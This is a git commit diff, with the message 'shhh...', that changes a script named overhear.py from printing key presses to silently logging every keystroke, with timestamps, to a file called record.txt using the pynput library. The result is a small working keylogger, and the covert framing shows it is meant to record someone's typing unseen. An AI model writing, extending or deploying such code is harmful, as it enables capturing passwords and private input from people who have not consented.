a63269b3f2034d3124161e25294a5b3ca0dd73dc
handsomepwy <peterrabbit2009@163.com>
2023-11-16 07:56:52 +0800

    shhh...

--- overhear.py
+++ overhear.py
@@ -1,11 +1,13 @@
 from pynput import keyboard
+import time
 
 
 def on_press(key):
-    try:
-        print('alphanumeric key {0} pressed'.format(key.char))
-    except AttributeError:
-        print('special key {0} pressed'.format(key))
+    with open("record.txt", "a") as f:
+        try:
+            f.write(f"key {key.char} pressed at {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n")
+        except AttributeError:
+            f.write(f"key {key} pressed at {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n")
 
 
 with keyboard.Listener(on_press=on_press) as listener:
